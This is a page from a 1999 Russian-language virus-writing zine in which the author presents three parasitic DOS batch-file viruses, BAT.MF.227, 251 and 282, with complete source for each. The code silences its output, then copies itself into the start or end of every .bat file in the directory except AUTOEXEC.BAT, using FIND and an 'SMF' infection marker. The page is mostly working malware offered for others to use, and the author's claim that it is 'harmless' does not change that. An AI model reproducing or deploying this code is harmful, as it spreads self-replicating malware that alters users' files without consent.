- [Duke's Virus Labs #6] - [Page 03] -

Семейство BAT.MF
(c) by Duke/SMF

Имя вируса    : BAT.MF.227, 251, 282
Автор         : Duke/SMF
Язык прогр.   : DOS-script
Дата создания : 07.03.99

   Продолжение серии неопасных паразитических BAT-вирусов, написанных одним
автором - мной ;)) Все вирусы проверяют файлы на зараженность, не поражают
файл AUTOEXEC.BAT, используют утилиту FIND для размножения и метку "SMF".
На этот раз предлагаю вам следующих зверьков:

Имя вируса    : BAT.MF.251
Имя файла     : smf_1.bat
Поражает файлы, записываясь в конец.

===== Cut here =====
@ctty nul%SMF%
if "%1=="SMF goto SMFz
echo.>SMF
find "SMF"<%0>>SMF
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call %0 SMF %%b
del SMF
goto SMFe
:SMFz
find "SMF"<%2
if not errorlevel 1 goto SMFe
type SMF>>%2
:SMFe BAT.SMF by Duke/SMF
===== Cut here =====

Имя вируса    : BAT.MF.227
Имя файла     : smf_2.bat
Поражает файлы, записываясь в конец.

===== Cut here =====
@ctty nul%SMF%
if "%1=="SMF goto SMFz
echo.>SMF
find "SMF"<%0>>SMF
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call %0 SMF %%b
del SMF
goto SMFe
:SMFz
find "SMF"<%2
if errorlevel 1 type SMF>>%2
:SMFe [Duke/SMF]
===== Cut here =====

Имя вируса    : BAT.MF.282
Имя файла     : smf_3.bat
Поражает файлы, записываясь в начало.

===== Cut here =====
@ctty nul%SMF%
if "%1=="@ goto SMFz
find "SMF"<%0>SMF.bat
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call SMF.bat @ %%b
del SMF.*
ctty con%SMF%
@goto SMF
:SMFz
find "SMF"<%2
if not errorlevel 1 goto SMF
type %2>SMF.1
type SMF.bat>%2
type SMF.1>>%2
:SMF [Duke/SMF]
===== Cut here =====